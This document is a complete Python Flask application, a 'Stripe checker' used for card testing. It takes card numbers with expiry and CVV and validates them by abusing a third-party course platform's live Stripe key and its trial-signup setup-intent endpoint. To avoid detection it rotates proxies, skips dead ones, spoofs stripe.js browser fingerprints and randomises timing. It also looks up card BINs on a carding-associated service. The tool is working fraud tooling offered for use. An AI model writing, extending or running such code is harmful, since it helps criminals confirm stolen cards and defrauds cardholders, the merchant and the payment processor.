# app.py
# Stripe checker — Sequential proxy check + dead proxy skip
#
# Usage:
#   GET /check?cc=4111111111111111|12|2027|123&proxy=http://u1:p1@h1:1,http://u2:p2@h2:2

import os
import re
import time
import json
import random
import asyncio
import threading
import requests
import aiohttp
from urllib.parse import unquote
from flask import Flask, request, jsonify

app = Flask(__name__)

# ─────────────────────────────────────────────
# CONFIG
# ─────────────────────────────────────────────
STRIPE_PK = os.environ.get(
    "STRIPE_PK",
    "pk_live_51NMHTlLvIw0k1EPu80ivQ0HYQ9NUotEncPEpUYYytP8YkUPB4vNGYICv1rB5Emf6nD1UzKXd0wKzdXnumGJqYPDt00Huwrpsfq"
)
STRIPE_VERSION = os.environ.get("STRIPE_VERSION", "2025-03-31.basil")
SIGNUP_URL = "https://ezycourse.com/signup"
SETUP_INTENT_URL = "https://ezycourse.com/api/ezycourse/onboarding/create-setup-intent"
HCAPTCHA_TOKEN = os.environ.get("HCAPTCHA_TOKEN", "")

UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/150.0.0.0 Safari/537.36"
)

DEFAULT_PROXIES = [
    p.strip()
    for p in os.environ.get("PROXIES", "").split(",")
    if p.strip()
]

# Proxy test config
PROXY_TEST_TIMEOUT = 8          # seconds per proxy test
DEAD_PROXY_COOLDOWN = 300       # dead proxy 5 min skip
REQUEST_DELAY = float(os.environ.get("REQUEST_DELAY", "0.5"))

# ─────────────────────────────────────────────
# DEAD PROXY TRACKER (in-memory)
# ─────────────────────────────────────────────
_proxy_lock = threading.Lock()
_dead_proxies = {}       # {proxy_url: unix_ts_marked_dead}
_proxy_stats = {}        # {proxy_url: {"ok": int, "fail": int, "last_ok": ts}}


def mark_dead(proxy: str):
    if not proxy:
        return
    with _proxy_lock:
        _dead_proxies[proxy] = time.time()
        s = _proxy_stats.setdefault(proxy, {"ok": 0, "fail": 0, "last_ok": 0})
        s["fail"] += 1


def mark_alive(proxy: str):
    if not proxy:
        return
    with _proxy_lock:
        _dead_proxies.pop(proxy, None)
        s = _proxy_stats.setdefault(proxy, {"ok": 0, "fail": 0, "last_ok": 0})
        s["ok"] += 1
        s["last_ok"] = time.time()


def is_dead(proxy: str) -> bool:
    if not proxy:
        return False
    with _proxy_lock:
        ts = _dead_proxies.get(proxy)
        if ts is None:
            return False
        if time.time() - ts > DEAD_PROXY_COOLDOWN:
            del _dead_proxies[proxy]
            return False
        return True


def alive_pool(pool: list) -> list:
    """Dead proxy বাদ দিয়ে alive pool return। সব dead হলে original pool।"""
    if not pool:
        return []
    alive = [p for p in pool if not is_dead(p)]
    return alive if alive else list(pool)


# ─────────────────────────────────────────────
# PROXY PARSING
# ─────────────────────────────────────────────
def mask_proxy(p: str) -> str:
    if not p:
        return "Not Used"
    return re.sub(r"//[^@]+@", "//***@", p)


def parse_proxy_param(raw: str):
    if not raw:
        return []
    out = []
    for chunk in raw.split(","):
        chunk = chunk.strip()
        if not chunk:
            continue
        if not re.match(r"^[a-zA-Z][a-zA-Z0-9+.\-]*://", chunk):
            chunk = "http://" + chunk
        out.append(chunk)
    return out


def get_proxy_pool(req) -> list:
    url_proxy = req.args.get("proxy", "").strip()
    if url_proxy:
        pool = parse_proxy_param(unquote(url_proxy))
        if pool:
            return pool
    return DEFAULT_PROXIES


def proxy_dict_from(p: str):
    if not p:
        return None
    return {"http": p, "https": p}


# ─────────────────────────────────────────────
# HELPERS
# ─────────────────────────────────────────────
def rand_hex(n: int) -> str:
    return "".join(random.choices("0123456789abcdef", k=n))


def rand_uuid_like() -> str:
    return "".join(random.choices("0123456789abcdef-", k=36))


def parse_cc(raw: str):
    if not raw:
        return None
    parts = [p.strip() for p in raw.split("|")]
    if len(parts) != 4:
        return None
    number, mm, yy, cvc = parts
    number = re.sub(r"\D", "", number)
    mm = re.sub(r"\D", "", mm).zfill(2)
    yy = re.sub(r"\D", "", yy)
    cvc = re.sub(r"\D", "", cvc)
    if not (12 <= len(number) <= 19):
        return None
    if len(mm) != 2 or len(yy) not in (2, 4) or len(cvc) not in (3, 4):
        return None
    if len(yy) == 4:
        yy = yy[2:]
    return number, mm, yy, cvc


def luhn_ok(number: str) -> bool:
    digits = [int(d) for d in number][::-1]
    total = 0
    for i, d in enumerate(digits):
        if i % 2 == 1:
            d *= 2
            if d > 9:
                d -= 9
        total += d
    return total % 10 == 0


# ─────────────────────────────────────────────
# PROXY ALIVE TEST — sequential one-by-one
# ─────────────────────────────────────────────
def test_proxy_alive(proxy_url: str, timeout: int = PROXY_TEST_TIMEOUT) -> bool:
    """
    একটা proxy দিয়ে small request পাঠায়।
    True = alive, False = dead।
    """
    if not proxy_url:
        return True  # direct connection

    test_endpoints = [
        "https://api.stripe.com/v1/tokens",   # Stripe (OPTIONS না, GET → 401 = proxy ok)
        "https://httpbin.org/ip",
        "https://api.ipify.org?format=json",
    ]

    proxies = {"http": proxy_url, "https": proxy_url}
    headers = {"user-agent": UA}

    for url in test_endpoints:
        try:
            r = requests.get(
                url, proxies=proxies, headers=headers,
                timeout=timeout, allow_redirects=False,
            )
            # 401/403/404/405 মানে proxy কাজ করছে (Stripe/target reach হয়েছে)
            if r.status_code in (200, 400, 401, 403, 404, 405, 429):
                return True
        except requests.exceptions.ProxyError:
            return False
        except requests.exceptions.ConnectTimeout:
            return False
        except requests.exceptions.ReadTimeout:
            # proxy reachable কিন্তু slow — taka alive ধরি
            continue
        except requests.exceptions.SSLError:
            # SSL MITM — proxy কাজ করছে কিন্তু cert issue
            continue
        except Exception:
            continue

    return False


def find_first_alive_proxy(pool: list):
    """
    Sequential check করে প্রথম alive proxy return করে।
    Returns: (proxy_url or None, checked_list)
    """
    if not pool:
        return None, []

    # dead গুলো skip
    candidates = [p for p in pool if not is_dead(p)]
    if not candidates:
        # সব dead — cooldown reset করে সব try
        candidates = list(pool)

    checked = []
    for px in candidates:
        ok = test_proxy_alive(px)
        checked.append({"proxy": mask_proxy(px), "alive": ok})
        if ok:
            mark_alive(px)
            return px, checked
        else:
            mark_dead(px)

    return None, checked


# ─────────────────────────────────────────────
# BIN LOOKUP (sequential proxy check)
# ─────────────────────────────────────────────
async def _bin_fetch(session, bin_number, proxy_url):
    async with session.get(
        f"https://bins.antipublic.cc/bins/{bin_number}",
        proxy=proxy_url,
    ) as res:
        if res.status != 200:
            return None
        try:
            return json.loads(await res.text())
        except Exception:
            return None


async def get_bin_info(card_number: str, proxy_pool: list):
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=10)

        # sequential alive proxy check
        px, _ = find_first_alive_proxy(proxy_pool)

        try:
            async with aiohttp.ClientSession(timeout=timeout) as session:
                data = await _bin_fetch(session, bin_number, px)
                if data:
                    return (
                        data.get("brand", "-"),
                        data.get("type", "-"),
                        data.get("level", "-"),
                        data.get("bank", "-"),
                        data.get("country_name", "-"),
                        data.get("country_flag", ""),
                    )
        except Exception:
            pass

        return "BIN Info Not Found", "-", "-", "-", "-", ""
    except Exception:
        return "-", "-", "-", "-", "-", ""


def run_bin_lookup(card_number: str, proxy_pool: list):
    try:
        return asyncio.run(get_bin_info(card_number, proxy_pool))
    except RuntimeError:
        loop = asyncio.new_event_loop()
        try:
            return loop.run_until_complete(get_bin_info(card_number, proxy_pool))
        finally:
            loop.close()


# ─────────────────────────────────────────────
# STRIPE FLOW
# ─────────────────────────────────────────────
def fresh_session(proxy_url: str = None) -> requests.Session:
    s = requests.Session()
    s.headers.update({
        "user-agent": UA,
        "accept-language": "en-US,en;q=0.9",
    })
    if proxy_url:
        s.proxies.update({"http": proxy_url, "https": proxy_url})
    try:
        s.get(SIGNUP_URL, timeout=20)
    except Exception:
        pass
    return s


def get_xsrf(session: requests.Session) -> str:
    tok = session.cookies.get("XSRF-TOKEN")
    return unquote(tok) if tok else ""


def _build_pm_payload(number, mm, yy, cvc):
    data = {
        "type": "card",
        "card[number]": number,
        "card[cvc]": cvc,
        "card[exp_month]": mm,
        "card[exp_year]": yy,
        "guid": rand_hex(32),
        "muid": rand_hex(32),
        "sid": rand_hex(32),
        "payment_user_agent": "stripe.js/142f43c30d; stripe-js-v3/142f43c30d; card-element",
        "referrer": "https://ezycourse.com",
        "time_on_page": str(random.randint(30000, 180000)),
        "client_attribution_metadata[client_session_id]": rand_uuid_like(),
        "client_attribution_metadata[merchant_integration_source]": "elements",
        "client_attribution_metadata[merchant_integration_subtype]": "card-element",
        "client_attribution_metadata[merchant_integration_version]": "2017",
        "client_attribution_metadata[wallet_config_id]": rand_uuid_like(),
        "key": STRIPE_PK,
        "_stripe_version": STRIPE_VERSION,
    }
    if HCAPTCHA_TOKEN:
        data["radar_options[hcaptcha_token]"] = HCAPTCHA_TOKEN
    return data


def create_payment_method(number, mm, yy, cvc, proxy_pool: list):
    """
    Sequential proxy check → first alive proxy দিয়ে Stripe PM create।
    যদি Stripe fail করে with proxy error → next proxy try।
    Returns: (status, json, used_proxy, checked_list)
    """
    headers = {
        "accept": "application/json",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://js.stripe.com",
        "referer": "https://js.stripe.com/",
        "user-agent": UA,
    }

    # candidates = dead skip
    candidates = [p for p in proxy_pool if not is_dead(p)]
    if not candidates:
        candidates = list(proxy_pool) if proxy_pool else [None]

    # sequential check
    checked = []
    last_status, last_json, last_px = 0, {"error": {"message": "no proxy tried"}}, None

    for px in candidates:
        # step 1: quick alive check (skip if recently alive)
        s = _proxy_stats.get(px, {})
        skip_test = (
            px
            and s.get("last_ok", 0) > time.time() - 120  # recently alive within 2 min
        )

        if px and not skip_test:
            alive = test_proxy_alive(px)
            checked.append({"proxy": mask_proxy(px), "alive": alive})
            if not alive:
                mark_dead(px)
                continue
            mark_alive(px)
        elif px:
            checked.append({"proxy": mask_proxy(px), "alive": True, "cached": True})

        # step 2: Stripe call with this proxy
        data = _build_pm_payload(number, mm, yy, cvc)
        proxies = proxy_dict_from(px)
        try:
            r = requests.post(
                "https://api.stripe.com/v1/payment_methods",
                headers=headers, data=data, timeout=45,
                proxies=proxies,
            )
            status = r.status_code
            try:
                j = r.json()
            except Exception:
                j = {"error": {"message": f"non-json: {r.text[:200]}"}}

            last_status, last_json, last_px = status, j, px

            # proxy-level errors → mark dead, try next
            if status in (0, 407, 429, 500, 502, 503, 504):
                if px:
                    mark_dead(px)
                continue

            # 200 or card error → final
            if status == 200 or (isinstance(j, dict) and "error" in j):
                if px:
                    mark_alive(px)
                return status, j, px, checked

            # unknown → try next
            if px:
                mark_dead(px)
            continue

        except (requests.exceptions.ProxyError,
                requests.exceptions.ConnectTimeout):
            if px:
                mark_dead(px)
            last_status = 0
            last_json = {"error": {"message": "proxy error"}}
            continue
        except requests.exceptions.ReadTimeout:
            last_status = 0
            last_json = {"error": {"message": "read timeout"}}
            continue
        except Exception as e:
            if px:
                mark_dead(px)
            last_status = 0
            last_json = {"error": {"message": f"network: {e}"}}
            continue

    return last_status, last_json, last_px, checked


def create_setup_intent(session, pm_id):
    headers = {
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json",
        "origin": "https://ezycourse.com",
        "referer": SIGNUP_URL + "?plan=pro&interval=month&trial=true",
        "user-agent": UA,
        "x-xsrf-token": get_xsrf(session),
    }
    payload = {"stripe_payment_method_uuid": pm_id, "is_trial": True}

    last_err = None
    for attempt in range(1, 3):
        try:
            r = session.post(
                SETUP_INTENT_URL, headers=headers, json=payload, timeout=45,
            )
            try:
                j = r.json()
            except Exception:
                j = {"raw": r.text[:1000]}
            if r.status_code == 429 and attempt < 2:
                time.sleep(1.5 * attempt)
                continue
            return r.status_code, j
        except Exception as e:
            last_err = str(e)
            if attempt < 2:
                time.sleep(1.5 * attempt)
                continue
            return 0, {"error": {"message": f"network: {last_err}"}}

    return 0, {"error": {"message": f"network: {last_err}"}}


def classify(pm_status, pm_data, si_status, si_data):
    if pm_status != 200:
        err = (pm_data or {}).get("error", {}) or {}
        return False, err.get("message", "Unknown error"), err.get("code", "error")

    if si_status == 200:
        msg = (
            si_data.get("message")
            or si_data.get("status")
            or si_data.get("data", {}).get("status")
            or "Approved"
        )
        if isinstance(msg, str):
            ml = msg.lower()
            if "declin" in ml or "fail" in ml or "error" in ml:
                return False, msg, si_data.get("code", "si_declined")
            return True, msg, si_data.get("code", "si_approved")
        return True, str(msg), "si_ok"

    err = (si_data or {}).get("error", {}) or {}
    msg = err.get("message") or si_data.get("message") or "Setup intent failed"
    code = err.get("code") or si_data.get("code") or "si_error"
    return False, msg, code


def build_bin_fields(brand, bin_type, level, bank, country, flag):
    brand_out = (brand or "UNKNOWN").upper()
    bank_out = (bank or "UNKNOWN").upper()
    type_out = (bin_type or "").upper()
    issuer = bank_out
    if type_out and type_out not in ("-", ""):
        issuer = f"{bank_out} - {type_out}"
    country_out = (
        f"{flag} {country.upper()}".strip()
        if country and country != "-" else "UNKNOWN"
    )
    return {
        "Brand": brand_out,
        "Issuer": issuer,
        "Country": country_out,
        "Level": level if level and level != "-" else None,
    }


# ─────────────────────────────────────────────
# ROUTES
# ─────────────────────────────────────────────
@app.route("/", methods=["GET"])
def index():
    with _proxy_lock:
        dead_n = len(_dead_proxies)
        stat_n = len(_proxy_stats)
    return jsonify({
        "name": "stripe-checker",
        "usage": [
            "/check?cc=CC|MM|YY|CVV",
            "/check?cc=CC|MM|YY|CVV&proxy=http://u:p@h:1,http://u:p@h:2",
        ],
        "default_proxies_loaded": len(DEFAULT_PROXIES),
        "dead_proxies": dead_n,
        "tracked_proxies": stat_n,
        "cooldown_sec": DEAD_PROXY_COOLDOWN,
    })


@app.route("/proxy-status", methods=["GET"])
def proxy_status():
    """Dead/alive proxy list + stats।"""
    with _proxy_lock:
        now = time.time()
        dead = {
            mask_proxy(p): {
                "cooldown_left": int(DEAD_PROXY_COOLDOWN - (now - ts)),
                "fail_count": _proxy_stats.get(p, {}).get("fail", 0),
            }
            for p, ts in _dead_proxies.items()
        }
        stats = {
            mask_proxy(p): s for p, s in _proxy_stats.items()
        }
    return jsonify({
        "dead_count": len(dead),
        "dead": dead,
        "stats": stats,
        "cooldown_sec": DEAD_PROXY_COOLDOWN,
    })


@app.route("/proxy-check", methods=["GET"])
def proxy_check():
    """
    Manual proxy test: /proxy-check?proxy=http://u:p@h:1,http://u:p@h:2
    Sequential check করে result দেয়।
    """
    pool = get_proxy_pool(request)
    if not pool:
        return jsonify({"error": "no proxy provided"}), 400

    results = []
    for px in pool:
        ok = test_proxy_alive(px)
        if ok:
            mark_alive(px)
        else:
            mark_dead(px)
        results.append({
            "proxy": mask_proxy(px),
            "alive": ok,
        })

    return jsonify({
        "total": len(pool),
        "alive": sum(1 for r in results if r["alive"]),
        "dead": sum(1 for r in results if not r["alive"]),
        "results": results,
    })


@app.route("/check", methods=["GET"])
def check():
    start = time.time()
    raw = request.args.get("cc", "")
    parsed = parse_cc(raw)

    proxy_pool = get_proxy_pool(request)
    proxy_source = "URL" if request.args.get("proxy", "").strip() else (
        "ENV" if DEFAULT_PROXIES else "NONE"
    )

    if not parsed:
        return jsonify({
            "cc": raw,
            "Gateway": "UNKNOWN",
            "Response": "Invalid input. Use cc=number|mm|yy|cvv",
            "Status": False,
            "Proxy": "Not Used",
            "ProxySource": proxy_source,
            "Time": f"{time.time() - start:.2f}s",
        }), 400

    number, mm, yy, cvc = parsed
    cc_display = f"{number}|{mm}|{yy}|{cvc}"

    if REQUEST_DELAY > 0:
        time.sleep(random.uniform(0, REQUEST_DELAY))

    # BIN
    brand, bin_type, level, bank, country, flag = run_bin_lookup(number, proxy_pool)
    bin_fields = build_bin_fields(brand, bin_type, level, bank, country, flag)

    # Stripe — sequential proxy check
    pm_status, pm_data, used_px, checked = create_payment_method(
        number, mm, yy, cvc, proxy_pool
    )
    pm_id = pm_data.get("id") if isinstance(pm_data, dict) else None

    si_status, si_data = (0, {})
    if pm_status == 200 and pm_id:
        session = fresh_session(proxy_url=used_px)
        si_status, si_data = create_setup_intent(session, pm_id)

    ok, msg, code = classify(pm_status, pm_data, si_status, si_data)
    proxy_display = mask_proxy(used_px) if used_px else "Not Used"

    return jsonify({
        "cc": cc_display,
        "Gateway": "Stripe Auth",
        "Response": msg,
        "Price": 0.0,
        "Currency": "USD",
        "Brand": bin_fields["Brand"],
        "Issuer": bin_fields["Issuer"],
        "Country": bin_fields["Country"],
        "Status": ok,
        "Proxy": proxy_display,
        "ProxySource": proxy_source,
        "ProxiesChecked": checked,
        "Time": f"{time.time() - start:.2f}s",
    })


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
